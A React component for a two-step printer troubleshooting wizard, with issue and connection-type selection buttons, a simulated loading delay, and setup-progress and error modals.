import React, { useState, useRef } from 'react';
import SetupProgressModal from './SetupProgressModal';
import { useState as useLocalState } from 'react';
import { useNavigate } from 'react-router-dom';

const issues = [
  { icon: 'fa-box-open', label: 'Set Up a New Printer' },
  { icon: 'fa-magnifying-glass', label: 'Install Printer Drivers' },
  { icon: 'fa-wifi', label: 'Fix Printer Offline Issue' },
  { icon: 'fa-network-wired', label: "Fix WiFi Connection Issues" },
  { icon: 'fa-gears', label: 'Printer Not Detected or Other Issues', wide: true },
];



function StepOne({ onSelect }) {
  return (
    <div className="text-center mb-4">
      <div className="text-blue-700 font-bold text-sm tracking-widest mb-2">STEP 1 OF 2</div>
      <div className="w-full h-1 bg-gray-200 rounded-full mb-6">
        <div className="h-1 bg-orange-400 rounded-full" style={{ width: '50%' }}></div>
      </div>
      <h2 className="text-2xl font-bold text-gray-800 mb-1">Select The Issue</h2>
      <p className="text-gray-500 text-base">Select what you need help with to continue:</p>
      <div className="grid grid-cols-2 gap-4 mt-8
        sm:grid-cols-2
        xs:grid-cols-1 xs:gap-3 xs:mt-6
        ">
        {issues.slice(0, 4).map((issue) => (
          <button
            key={issue.label}
            className="flex flex-col items-center justify-center border border-gray-200 rounded-lg py-7 px-2 bg-white hover:bg-blue-50 transition-colors focus:outline-none
              xs:w-full xs:py-5 xs:text-base"
            onClick={() => onSelect(issue.label)}
          >
            <i className={`fa-solid ${issue.icon} text-3xl text-blue-700 mb-3`}></i>
            <span className="font-semibold text-gray-700 text-base xs:text-sm">{issue.label}</span>
          </button>
        ))}
      </div>
      <div className="flex justify-center mt-4 xs:mt-3 xs:block">
        <button
          className="flex flex-col items-center justify-center border border-gray-200 rounded-lg py-7 px-2 bg-white hover:bg-blue-50 transition-colors focus:outline-none w-4/5 xs:w-full xs:py-5 xs:text-base"
          onClick={() => onSelect(issues[4].label)}
        >
          <i className="fa-solid fa-gears text-3xl text-blue-700 mb-3"></i>
          <span className="font-semibold text-gray-700 text-base xs:text-sm">{issues[4].label}</span>
        </button>

        <p className="text-gray-500 pt-10 text-sm">Need help? Contact our support team via chat or email.</p>
      </div>
    </div>
  );
}




const connections = [
  { icon: 'fa-signal', label: 'Wireless (WiFi) Connection' },
  { icon: 'fa-usb', label: 'USB / Wired Connection' },
  { icon: 'fa-bluetooth-b', label: 'Ethernet (LAN) Connection' },
  { icon: 'fa-circle-question', label: 'Not Sure / Other Method' },
];


function StepThree({ onBack }) {
  const navigate = useNavigate();
  return (
    <div className="text-center mb-4">
      <div className="text-blue-700 font-bold text-sm tracking-widest mb-2">STEP 2 OF 2</div>
      <div className="w-full h-1 bg-gray-200 rounded-full mb-6">
        <div className="h-1 bg-orange-400 rounded-full" style={{ width: '100%' }}></div>
      </div>
      <h2 className="text-2xl font-bold text-gray-800 mb-1">How Is Your Printer Connected?</h2>
      <p className="text-gray-500 text-base mb-6">Choose how your printer connects to your device to continue.</p>
      <div className="grid grid-cols-2 gap-4 mb-4">
        {connections.map((conn) => (
          <button
            key={conn.label}
            className="flex flex-col items-center justify-center border border-gray-200 rounded-lg py-7 px-2 bg-white hover:bg-blue-50 transition-colors focus:outline-none"
            onClick={() => navigate('/model-search')}
          >
            <i className={`fa-solid ${conn.icon} text-3xl text-blue-700 mb-3`}></i>
            <span className="font-semibold text-gray-700 text-base">{conn.label}</span>
          </button>
        ))}
      </div>
      {/* <div className="flex justify-center mt-2">
        <button className="text-gray-500 hover:underline text-sm flex items-center" onClick={onBack}>
          <i className="fa-solid fa-arrow-left mr-1"></i> Back
        </button>

        
      </div> */}
      <p className="text-gray-500 pt-5 text-sm">Need help? Contact our support team via chat or email.</p>
    </div>
  );
}



const IssueSelector = () => {
  const [step, setStep] = useState(1);
  const [showModal, setShowModal] = useState(false);
  const [showError, setShowError] = useState(false);
  const [loading, setLoading] = useState(false);
  const [whiteOverlay, setWhiteOverlay] = useState(false);
  const nameRef = useRef();
  const [userName, setUserName] = useState('Michal');
  const [printerModel, setPrinterModel] = useState('Officejet');
  
  const navigate = useNavigate();

  const handleFinalSubmit = (e, form) => {
    e.preventDefault();
    setLoading(true);
    setTimeout(() => {
      setLoading(false);
      const name = form.name?.trim() || nameRef.current?.value?.trim() || 'Michal';
      setUserName(name);
      setPrinterModel(form.model?.trim() || 'Officejet');
      setShowModal(true);
    }, 2000);
  };

  const handleError = () => {
    setShowModal(false);
    setTimeout(() => setShowError(true), 300);
  };

  // Show white overlay when any modal is open
  if (showModal || whiteOverlay) {
    return <div className="fixed inset-0 z-50 bg-white flex items-center justify-center"><SetupProgressModal open={showModal} onClose={() => setShowModal(false)} user={userName} printer={printerModel} onError={handleError} /></div>;
  }
  if (showError) {
    return <div className="fixed inset-0 z-50 bg-white flex items-center justify-center"><ErrorModal open={showError} onClose={() => setShowError(false)} printer="Officejet" onChat={() => {
      alert('Chat support is currently unavailable.');
      setShowError(false);
      setTimeout(() => {
        navigate('/');
      }, 100);
    }} /></div>;
  }
  // Store selected issue in localStorage and advance step
  const handleIssueSelect = (issueLabel) => {
    localStorage.setItem('issue', issueLabel);
    setStep(3);
  };

  return (
    <div className="flex justify-center items-start min-h-[70vh] bg-gray-100 py-12">
      <div className="bg-white rounded-xl shadow-2xl w-full max-w-2xl p-8 mx-2">
        {step === 1 && <StepOne onSelect={handleIssueSelect} />}
        {step === 3 && <StepThree onBack={() => setStep(1)} />}
      </div>
    </div>
  );
};

export default IssueSelector;
